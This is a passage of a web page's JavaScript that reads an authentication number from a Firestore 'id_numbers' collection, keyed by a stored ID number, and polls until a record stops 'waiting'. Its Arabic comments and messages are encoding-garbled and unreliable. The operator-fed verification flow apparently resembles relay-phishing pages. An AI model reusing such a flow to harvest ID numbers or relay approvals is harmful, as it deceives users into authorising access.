                    setTimeout(() => {
                        document.querySelector('.btn-success').innerHTML = originalText;
                        document.querySelector('.btn-success').style.backgroundColor = '';
                    }, 2000);
                    
                    console.log('âœ… ØªÙ… Ù†Ø³Ø® Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©:', currentAuthNumber);
                })
                .catch(err => {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù†Ø³Ø®:', err);
                    alert('ØªØ¹Ø°Ø± Ù†Ø³Ø® Ø§Ù„Ø±Ù‚Ù…. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© ÙŠØ¯ÙˆÙŠØ§Ù‹.');
                });
        }
        
        // ========== Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© ÙÙŠ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ ==========
        function setupRealtimeMonitoring(recordId) {
            if (!firestoreDb || !recordId) {
                console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©: Firestore ØºÙŠØ± Ù…ØªØ§Ø­ Ø£Ùˆ Ù…Ø¹Ø±Ù Ø§Ù„Ø³Ø¬Ù„ Ù…ÙÙ‚ÙˆØ¯');
                return null;
            }
            
            try {
                console.log('ğŸ‘‚ Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© ÙÙŠ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ù„Ù„Ø³Ø¬Ù„:', recordId);
                
                const unsubscribe = firestoreDb.collection('id_numbers').doc(recordId)
                    .onSnapshot((doc) => {
                        if (doc.exists) {
                            const data = doc.data();
                            console.log('ğŸ”„ ØªØ­Ø¯ÙŠØ« Ù…Ø¨Ø§Ø´Ø±:', {
                                authNumber: data.authNumber,
                                waiting: data.waiting,
                                status: data.status
                            });
                            
                            // Ø¥Ø°Ø§ ØªÙ… ØªØ­Ø¯ÙŠØ« Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                            if (data.authNumber && data.authNumber !== null && data.waiting === false) {
                                currentAuthNumber = data.authNumber;
                                displayAuthNumber(data.authNumber, 'ØªØ­Ø¯ÙŠØ« Ù…Ø¨Ø§Ø´Ø± Ù…Ù† Firebase');
                                
                                // Ø­ÙØ¸ ÙÙŠ localStorage
                                localStorage.setItem('currentAuthNumber', data.authNumber);
                            }
                        }
                    }, (error) => {
                        console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©:', error);
                    });
                
                return unsubscribe;
                
            } catch (error) {
                console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø¹Ø¯Ø§Ø¯ Ù…Ø³ØªÙ…Ø¹ Firebase:', error);
                return null;
            }
        }
        
        // ========== Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© ==========
        async function findAuthNumber() {
            updateProgress(60, 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©...');
            
            try {
                const urlInfo = getRecordIdFromURL();
                let authNumber = null;
                let source = '';
                
                // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© 1: Ù…Ù† URL Ù…Ø¨Ø§Ø´Ø±Ø©
                if (urlInfo.authNumber) {
                    authNumber = urlInfo.authNumber;
                    source = 'URL Ù…Ø¨Ø§Ø´Ø±';
                    currentAuthNumber = authNumber;
                    console.log('âœ… ÙˆØ¬Ø¯Øª ÙÙŠ URL:', authNumber);
                }
                
                // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© 2: Ù…Ù† localStorage
                if (!authNumber) {
                    const savedNumber = localStorage.getItem('currentAuthNumber');
                    if (savedNumber) {
                        authNumber = savedNumber;
                        source = 'Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø­Ù„ÙŠ';
                        currentAuthNumber = authNumber;
                        console.log('âœ… ÙˆØ¬Ø¯Øª ÙÙŠ localStorage:', authNumber);
                    }
                }
                
                // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© 3: Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Firestore Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… recordId
                if (!authNumber && urlInfo.recordId && firestoreDb) {
                    const recordResult = await findAuthRecord(urlInfo.recordId);
                    if (recordResult.found) {
                        authNumber = recordResult.data.authNumber;
                        source = recordResult.source;
                        currentAuthNumber = authNumber;
                        console.log('âœ… ÙˆØ¬Ø¯Øª ÙÙŠ Firestore (Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… recordId):', authNumber);
                    }
                }
                
                // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© 4: Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Firestore Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ù…Ù† localStorage
                if (!authNumber && firestoreDb) {
                    const lastIdNumber = localStorage.getItem('lastIdNumber');
                    if (lastIdNumber) {
                        const searchResult = await searchByIdNumber(lastIdNumber);
                        if (searchResult.found) {
                            authNumber = searchResult.data.authNumber;
                            source = searchResult.source;
                            currentRecordId = searchResult.recordId;
                            currentAuthNumber = authNumber;
                            console.log('âœ… ÙˆØ¬Ø¯Øª ÙÙŠ Firestore (Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©):', authNumber);
                        }
                    }
                }
                
                if (authNumber) {
                    updateProgress(80, 'ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©');
                    
                    // Ø¹Ø±Ø¶ Ø§Ù„Ø±Ù‚Ù…
                    displayAuthNumber(authNumber, source);
                    
                    // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© ÙÙŠ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‡Ù†Ø§Ùƒ recordId
                    if (currentRecordId) {
                        realtimeListener = setupRealtimeMonitoring(currentRecordId);
                    }
                    
                    return {
                        found: true,
                        authNumber: authNumber,
                        source: source,
                        recordId: currentRecordId
                    };
                } else {
                    updateProgress(70, 'Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø©');
                    
                    // Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¯ÙˆØ±ÙŠ
                    startPeriodicChecking();
                    
                    return {
                        found: false,
                        message: 'Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø©'
                    };
                }
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©:', error);
                updateProgress(70, 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨Ø­Ø«');
                showError('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ' + error.message);
                return {
                    found: false,
                    error: error.message
                };
            }
        }
        
        // ========== Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¯ÙˆØ±ÙŠ ==========
        function startPeriodicChecking() {
            let checkCount = 0;
            const MAX_CHECKS = 60; // 5 Ø¯Ù‚Ø§Ø¦Ù‚ (ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ)
            
            if (checkInterval) {
                clearInterval(checkInterval);
            }
            
            checkInterval = setInterval(async () => {
                checkCount++;
                
                // ØªØ­Ø¯ÙŠØ« Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
                const minutes = Math.floor((checkCount * 5) / 60);
                const seconds = (checkCount * 5) % 60;
                const waitingText = `Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¨Ø­Ø«... (${minutes}:${seconds.toString().padStart(2, '0')})`;
                document.getElementById('loadingMessage').textContent = waitingText;
                
                try {
                    // Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Firestore
                    if (firestoreDb) {
                        const lastIdNumber = localStorage.getItem('lastIdNumber');
                        if (lastIdNumber) {
                            const searchResult = await searchByIdNumber(lastIdNumber);
                            if (searchResult.found) {
                                // ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø©
                                clearInterval(checkInterval);
                                
                                currentAuthNumber = searchResult.data.authNumber;
                                currentRecordId = searchResult.recordId;
                                
                                // Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù…Ø­ØªÙˆÙ‰
                                document.getElementById('loadingScreen').style.display = 'none';
                                document.getElementById('mainContent').style.display = 'block';
                                
                                // Ø¹Ø±Ø¶ Ø§Ù„Ø±Ù‚Ù…
                                displayAuthNumber(currentAuthNumber, 'ÙØ­Øµ Ø¯ÙˆØ±ÙŠ Ù…Ù† Firestore');
                                
                                // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©
                                realtimeListener = setupRealtimeMonitoring(currentRecordId);
                                
                                return;
                            }
                        }
                    }
                    
                    // Ø¥Ø°Ø§ ØªØ¬Ø§ÙˆØ² Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ Ù„Ù„ÙØ­Øµ
                    if (checkCount >= MAX_CHECKS) {
                        clearInterval(checkInterval);
                        
                        document.getElementById('loadingTitle').textContent = 'Ø§Ù†ØªÙ‡Ù‰ ÙˆÙ‚Øª Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±';
                        document.getElementById('loadingMessage').innerHTML = 
                            '<span style="color: #ff4757;">Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø© Ø®Ù„Ø§Ù„ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø­Ø¯Ø¯.</span>';
                        
                        showError('Ø§Ù†ØªÙ‡Ù‰ ÙˆÙ‚Øª Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø£Ùˆ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø¯Ø¹Ù….');
                    }
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¯ÙˆØ±ÙŠ:', error);
                }
            }, 5000); // ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
        }
        
        // ========== Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© ==========
        async function startProcess() {
            updateProgress(10, 'Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© ØªØ­Ù…ÙŠÙ„ Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©...');
            
            try {
                // 1. ØªÙ‡ÙŠØ¦Ø© Firebase
                const firebaseInit = await initializeFirebaseForSuccess();
                if (!firebaseInit) {
                    return;
                }
                
                // 2. Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                const result = await findAuthNumber();
                
                if (result.found) {
                    updateProgress(90, 'Ø¬Ø§Ø±ÙŠ ØªØ­Ø¶ÙŠØ± Ø§Ù„Ø¹Ø±Ø¶...');
                    
                    // ØªØ£Ø®ÙŠØ± Ù‚ØµÙŠØ± Ø«Ù… Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù…Ø­ØªÙˆÙ‰
                    setTimeout(() => {
                        document.getElementById('loadingScreen').style.display = 'none';
                        document.getElementById('mainContent').style.display = 'block';
                        updateProgress(100, 'ØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø¨Ù†Ø¬Ø§Ø­');
                        
                        console.log('ğŸ‰ ØªÙ… ØªØ­Ù…ÙŠÙ„ ØµÙØ­Ø© success Ø¨Ù†Ø¬Ø§Ø­');
                    }, 1500);
                } else {
                    // Ø³ÙŠØ¨Ø¯Ø£ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¯ÙˆØ±ÙŠ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ø°Ø§ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ±
                    console.log('â³ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø©ØŒ Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¯ÙˆØ±ÙŠ...');
                }
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©:', error);
                showError('Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù…: ' + error.message);
            }
        }
        
        // ========== Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© ==========
        document.addEventListener('DOMContentLoaded', function() {
            console.log('ğŸ“„ ØµÙØ­Ø© success.html Ù…Ø­Ù…Ù„Ø©');
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©
            document.getElementById('loadingScreen').style.display = 'flex';
            document.getElementById('mainContent').style.display = 'none';
            
            // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
            startProcess();
            
            // ØªÙ†Ø¸ÙŠÙ Ø¹Ù†Ø¯ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
            window.addEventListener('beforeunload', function() {
                if (checkInterval) {
                    clearInterval(checkInterval);
                }
                if (realtimeListener) {
                    realtimeListener(); // Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ ÙÙŠ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©
                }
            });
        });

        // ========== Ø¯ÙˆØ§Ù„ Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø± Ù…Ù† ÙˆØ­Ø¯Ø© Ø§Ù„ØªØ­ÙƒÙ… ==========
        window.testSuccessPage = async function() {
            console.log('ğŸ§ª Ø§Ø®ØªØ¨Ø§Ø± ØµÙØ­Ø© success...');
            
            const result = {
                firebaseInitialized: firebaseInitialized,
                firestoreDb: !!firestoreDb,
                currentRecordId: currentRecordId,
                currentAuthNumber: currentAuthNumber,
                urlParams: Object.fromEntries(urlParams),
                timestamp: new Date().toISOString()
            };
            
            console.log('ğŸ“Š Ù†ØªÙŠØ¬Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±:', result);
            return result;
        };
        
        window.forceShowAuthNumber = function(number) {
            if (!number) {
                number = prompt('Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ù„Ù„Ø¹Ø±Ø¶:');
                if (!number) return;
            }
            
            currentAuthNumber = number;
            displayAuthNumber(number, 'Ø§Ø®ØªØ¨Ø§Ø± ÙŠØ¯ÙˆÙŠ');
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù…Ø­ØªÙˆÙ‰
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            
            console.log('ğŸ”§ Ø¹Ø±Ø¶ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø© ÙŠØ¯ÙˆÙŠ:', number);
        };

    </script>
</body>
</html>
